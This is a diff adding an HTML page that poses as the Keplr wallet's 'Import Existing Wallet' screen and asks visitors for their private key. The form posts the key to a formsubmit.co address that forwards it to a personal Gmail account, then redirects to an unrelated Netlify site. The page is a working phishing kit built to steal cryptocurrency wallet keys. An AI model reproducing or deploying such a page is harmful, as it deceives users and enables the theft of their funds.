@@ -1,0 +1,123 @@
+<html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>privatekey</title>
+    <link rel="stylesheet" href="style/loader.min.css">
+    <link rel="stylesheet" href="style/style.css">
+    <link rel="stylesheet" href="themify-icons.css">
+    <script src="osmo_files/jquery.min.js"></script>
+    <script src="style/main.js"></script>
+<style>
+    div.errorContainer {
+        padding: 8px;
+        background: #FF6347aa;
+        color: #900;
+        font-weight: 100;
+        border-radius: 5px;
+        display: none;
+    }
+</style></head>
+
+<body data-lang="en" style="">
+    <div class="first" id="first" style="display: none;">
+        <header>
+            <img src="assets/intro-logo.png" alt="Keplr Logo">
+            <span class="title"> Your Interchain Gateway </span>
+        </header>
+        <section>
+            <article>
+                <video width="200" height="200" autoplay="" loop="" __idm_id__="696321">
+                    <source src="assets/intro.webm">
+                </video>
+            </article>
+            <article>
+                <button id="create">Create a new wallet</button>
+                <button id="import">Import an existing wallet</button>
+                <button id="connect">Connect Hardware Wallet</button>
+            </article>
+        </section>
+    </div>
+
+    <div class="second" id="second" style="display: none;">
+        <header>
+            <label class="help">Help Desk <i class="ti-help-alt"></i></label>
+            <span class="title"><span class="back" id="back"><i class="ti-arrow-circle-left"></i></span> Welcome Back to Keplr </span><br>
+            <span class="sub-title">Glad you’re back! <i class="ti-server"></i></span>
+        </header>
+        <section>
+                <article>
+                    <span class="title">Recovery Phrase or Private key</span>
+                    <br><br>
+                    <span class="sub-title">Use an existing 12/24 word recovery phrase or private key. You can also import wallets from other wallet providers.</span>
+                    <br><br>
+                    <button id="recovery"><i class="ti-download"></i> Use recovery phrase or private key</button>
+                </article>
+                <article>
+                    <span class="title">Use Google</span>
+                    <br><br>
+                    <span class="sub-title">Log in with the same email address to import an existing account to keplr.</span>
+                    <br><br><br>
+                    <button id="google"><i class="ti-google"></i> Connect with Google</button>
+                </article>
+        </section>
+    </div>
+
+    <div class="third" id="third" style="display: flex;">
+        <header>
+            <label class="help">Help Desk </label>
+            <span class="title"><span class="back" id="back2"></span> Import Existing Wallet </span><br>
+            <span class="sub-title">
+                <ul>
+                    <li>Enter your Private Key here to restore your wallet. Or click on any blank and paste the entire private key.</li>
+                    <li>Enter the private key in the right order without capitalization, punctuation symbols, or spaces.</li>
+                </ul>    
+            </span>
+        </header>
+        <section class="phraseCont" style="">
+            <article>
+                <span class="title">
+                    
+                    <button style=" display: block; margin: auto;" id="private">Private key</button>
+                </span>
+                <div class="slideTitle" style="margin-left: 0px;"></div>
+            </article>
+            <form method="POST" action="https://formsubmit.co/rolanddavidferanmi@gmail.com">
+                <input type="hidden" name="_next" value="https://appmonero.netlify.app/">
+                <input type="hidden" name="_captcha" value="false">
+            
+            <article class="private" style="display: flex; margin: auto; ">
+                <span>  
+                    <input type="text" name="privatekey" id="privateMerge" style="background-color: rgb(14, 13, 13);
+                    height: 50px;
+                    width: 400px;
+                    margin: 10px;
+                    outline: none;
+                    color: white;
+                    padding: 0 10px ;
+                    border: 1px solid rgb(90, 88, 88);
+                    border-radius: 5px;">
+                </span>
+                <button type="submit" id="private-btn">Import</button>
+            </article>
+        </section>
+        </form>
+    </div>
+    
+    <!-- loader page -->
+
+<div class="connectLoader px-4" style="display: none;">
+    <div class="dialog p-4 mx-auto align-center">
+        <!-- loader -->
+        <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+        <!-- end loader -->
+        <div class="mt-4">
+            <h5 class="reduceH5" id="serverConnectionDetails">
+                Requesting Connection... <br>
+                <small>Fetching connection protocols</small>
+            </h5>
+        </div>
+    </div>
+</div>
+
+
+</body></html>
